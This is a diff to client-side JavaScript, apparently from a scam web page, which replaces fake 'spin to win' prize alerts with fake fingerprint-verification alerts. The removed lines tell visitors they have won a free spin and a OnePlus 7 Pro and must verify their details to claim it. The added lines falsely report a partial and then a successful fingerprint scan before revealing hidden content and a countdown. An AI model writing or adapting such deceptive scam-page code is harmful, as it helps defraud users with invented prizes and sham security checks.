@@ -983,8 +983,8 @@ function animateProgress(diff) {
         e.className = e.className + "spinAround", n.style.display = "none", t.style.display = "block", setTimeout(function() {
             t.style.display = "none", o.style.display = "block"
         }, 150), setTimeout(function() {
-            alert("You have been rewarded with one exta free spin.. "), spin2enabled = !0
-        }, 6500)
+            alert("Please try again. Only partial fingerprint was recognized.. "), spin2enabled = !0
+        }, 2500)
     }
 
     function spin2() {
@@ -996,7 +996,7 @@ function animateProgress(diff) {
             e.className = e.className + " spinAround2", n.style.display = "none", t.style.display = "block", setTimeout(function() {
                 t.style.display = "none", o.style.display = "block"
             }, 150), setTimeout(function() {
-                var e = alert("Congratulations!\n\You have won a  OnePlus 7 Pro (Almond, 8GB RAM, 256GB Storage) in todays competition ,  Please complete the instructions to verify your details and claim your prize ");
+                var e = alert("Congratulations!\n\Your Fingerprint was successfully verified.  Please press OK to continue  ");
                 e === !0 || $(".hide-all").hide(), $(".show-all").show();
                 var n = 299,
                     t = setInterval(function() {
